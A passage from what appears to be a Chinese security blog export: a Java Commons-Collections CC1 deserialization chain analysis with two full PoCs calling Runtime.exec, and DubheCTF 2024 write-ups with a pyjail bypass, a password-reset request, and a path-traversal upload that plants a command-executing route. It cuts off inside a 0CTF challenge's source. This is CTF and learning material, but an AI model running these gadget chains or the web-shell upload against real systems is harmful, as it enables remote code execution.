class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Study2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;what2&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">AIH</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> AIH.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">annotation</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(annotation);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><h5 id="1-必须需要put一个键为”value”的值"><a href="#1-必须需要put一个键为”value”的值" class="headerlink" title="1. 必须需要put一个键为”value”的值:"></a>1. 必须需要put一个键为”value”的值:</h5><p>假如我们把<code>map.put(&quot;value&quot;,&quot;what2&quot;);</code>改成<code>map.put(&quot;what1&quot;,&quot;what2&quot;);</code><br>然后调试可以发现memberType是null<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240314151110.png" alt="image.png"></p>
<p>这里memeberType是获取注解中成员变量的名称,然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解是没有成员变量的,而之前type传了一个Target.class<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240314151835.png" alt="image.png"><br>它有一个value()成员变量,修改之后再调试就可以进入if循环了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240314152237.png" alt="image.png"></p>
<h3 id="LazyMap链-动态代理"><a href="#LazyMap链-动态代理" class="headerlink" title="LazyMap链(动态代理)"></a>LazyMap链(动态代理)</h3><p>需要创建一个动态代理类,我们设置它是一个AnnotationInvocationHandler类生成的动态代理对象，在调用Map的所有方法,比如entrySet()方法时，会调用被代理的AnnotationInvocationHandler的invoke()方法<br>—&gt;<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memberValues.get(member);</span><br></pre></td></tr></table></figure><br>—&gt;<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LazyMap.get()</span><br></pre></td></tr></table></figure><br>—&gt;<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>成功调用transform</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Poc2"><a href="#Poc2" class="headerlink" title="Poc2:"></a>Poc2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//payload</span></span><br><span class="line">        Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> LazyMap.decorate(map, d);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ct</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ct.newInstance(Target.class, map1);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ct.newInstance(Target.class, proxyMap);  <span class="comment">//这样写也可handler = (InvocationHandler) ct.newInstance(Retention.class, proxyMap);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，当作网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(o);  <span class="comment">//如果用的后面那种，则把o换成handler</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(f1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        f2.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>动态代理的原理可以参考: <a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a><br>将Map的entrySet方法看成需要代理的接口方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ct.newInstance(Target.class, map1);  </span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);  </span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ct.newInstance(Target.class, proxyMap);</span><br></pre></td></tr></table></figure></p>
<p>这里先创建一个InvocationHandler实例,负责实现接口方法的调用<br>创建一个proxyMap负责指定需要代理的classloader和需要代理的接口数组,这里是Map<br>最后将proxyMap传入AnnotationInvocationHandler的memberValues成员</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>jdk8u71 及以后的版本没有了能调用 readobject 中 <code>setValue()</code> 方法的地方。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/12669">https://xz.aliyun.com/t/12669</a><br><a href="https://j7ur8.github.io/WebBook/Java/CC1%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">https://j7ur8.github.io/WebBook/Java/CC1%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>DubheCTF2024 wp</title>
    <url>/2024/03/18/DubheCTF%202024/</url>
    <content><![CDATA[<h3 id="ezPythonCheckin"><a href="#ezPythonCheckin" class="headerlink" title="ezPythonCheckin"></a>ezPythonCheckin</h3><p>一个pyjail,过滤了一些危险函数,直接open读取即可<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&quot;nosec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;[]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;().&quot;</span>,</span><br><span class="line">    <span class="string">&quot;builtins&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dict&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dir&quot;</span>,</span><br><span class="line">    <span class="string">&quot;locals&quot;</span>,</span><br><span class="line">    <span class="string">&quot;base&quot;</span>,</span><br><span class="line">    <span class="string">&quot;classes&quot;</span>,</span><br><span class="line">    <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mro&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">b&quot;print(open(&#x27;/flag&#x27;).read())&quot;</span></span><br><span class="line">data=base64.b64encode(<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">1600</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">decode_data = base64.b64decode(data).decode()</span><br><span class="line"><span class="built_in">print</span>(decode_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>(item <span class="keyword">in</span> decode_data <span class="keyword">for</span> item <span class="keyword">in</span> black_list):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not Safe&quot;</span>)</span><br></pre></td></tr></table></figure><br>直接读<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240316092253.png" alt="image.png"><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DubheCTF&#123;l3HC7F_h45_4_8e77ER_Ch4lLEngE!&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Wecat"><a href="#Wecat" class="headerlink" title="Wecat"></a>Wecat</h3><p>改密码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://1.95.54.149:42199/wechatAPI/login/modifyPwd&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="string">&quot;admin@wecat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">req=requests.put(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240316153841.png" alt="image.png"></p>
<p>然后登录抓包拿token<br>上传js文件:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1:8088/wechatAPI/upload/chunks&quot;</span></span><br><span class="line"><span class="comment">#url=&quot;http://111.229.158.40:2211&quot;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA2MDMzNTMsImRhdGEiOiJ1bmRlZmluZWRwYXNzIiwiaWF0IjoxNzEwNTk5NzUzfQ.Q_ZBa0uCSS8XAuGVkc8orRcDDNcGYYnNtpt2U-NfRKQ&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;hash&quot;</span>:<span class="string">&quot;../src/route&quot;</span>,</span><br><span class="line">    <span class="string">&quot;chunkIndex&quot;</span>:<span class="string">&quot;admin.js&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./test.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">req=requests.post(url,headers=headers,data=data,files=file)</span><br><span class="line"><span class="built_in">print</span>(req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>这里上传文件本来是上传到upload目录的,当时我看路径是用<code>path.join</code>拼接的,本地docker调试了一下发现可以跨目录上传,于是想到了上传到route路由来执行js文件,本地把admin.js改成任意会报错,再改回来发现又好了,说明js是动态加载的,因此只需要写需要上传js文件的路径即可,后来是De1ty师傅写的js脚本:</p>
<p>原先的admin.js代码里的内容不要动,在中间路由代码里新建一个路由<br>js:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/wechatAPI/admin/hack&#x27;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">execPromise</span> = command =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">exec</span>(command, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`错误: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">                <span class="title function_">reject</span>(error);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">            <span class="title function_">resolve</span>(&#123; stdout, stderr &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">execPromise</span>(<span class="string">&#x27;cd /;./readflag&#x27;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;hack&#x27;</span>,</span><br><span class="line">            <span class="attr">execResult</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="attr">error</span>: error.<span class="property">message</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>带token访问<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240316224617.png" alt="image.png"></p>
<h3 id="cipher"><a href="#cipher" class="headerlink" title="cipher"></a>cipher</h3><p>先用Windows自带的磁盘管理,操作-&gt;附加vhd,然后public目录发现flag.jpg,winhex里F9打开发现不是jpg的格式,恢复的时候winhex提示被加密过<br>Powershell记录:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-17%20163925.png" alt="屏幕截图 2024-03-17 163925.png"><br>里面有用户的密码<br>查看文件属性:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-17%20173432.png" alt="屏幕截图 2024-03-17 173432.png"><br>上网搜一下AE是EFS加密,上网搜解密工具搜到Advanced EFS Data Recovery,破解版下载地址: <a href="https://www.kxdw.com/soft/32179.html">https://www.kxdw.com/soft/32179.html</a></p>
<p>一开始扫描keys,全是红的<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-17%20173237.png" alt="屏幕截图 2024-03-17 173237.png"><br>加两个用户名密码就绿了</p>
<p>直接去解密flag.jpg就可以了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-17%20173302.png" alt="屏幕截图 2024-03-17 173302.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DubheCTF&#123;149b07d3-ac2e-4a66-9dc3-5e39e8ecb4c9&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 0CTF newdiary复现</title>
    <url>/2024/03/21/2023%200CTF%20newdiary%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>app.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; assert &#125; = <span class="built_in">require</span>(<span class="string">&quot;console&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; sha256, random_bytes &#125; = <span class="built_in">require</span>(<span class="string">&quot;./utils&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; visit &#125; = <span class="built_in">require</span>(<span class="string">&quot;./bot&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">genNonce</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="string">&quot;_&quot;</span></span><br><span class="line">    .<span class="title function_">repeat</span>(<span class="number">32</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/_/g</span>, <span class="function">() =&gt;</span></span><br><span class="line">      <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.<span class="title function_">charAt</span>(crypto.<span class="title function_">randomInt</span>(<span class="number">36</span>))</span><br><span class="line">    );</span><br><span class="line"><span class="keyword">const</span> report = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">now</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">floor</span>(+<span class="keyword">new</span> <span class="title class_">Date</span>() / <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/static&quot;</span>, express.<span class="title function_">static</span>(<span class="string">&quot;static&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(</span><br><span class="line">  <span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">600000</span> &#125;,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">random_bytes</span>(<span class="number">64</span>),</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="property">nonce</span> = <span class="title function_">genNonce</span>();</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&quot;X-Content-Type-Options&quot;</span>, <span class="string">&quot;nosniff&quot;</span>);</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache, no-store&quot;</span>);</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&quot;html&quot;</span>, <span class="built_in">require</span>(<span class="string">&quot;ejs&quot;</span>).<span class="property">renderFile</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;html&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>([[]]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> notes = <span class="keyword">new</span> <span class="title class_">Map</span>([[]]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> share_notes = <span class="keyword">new</span> <span class="title class_">Map</span>([[]]);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;index&quot;</span>, &#123;</span><br><span class="line">      <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">      <span 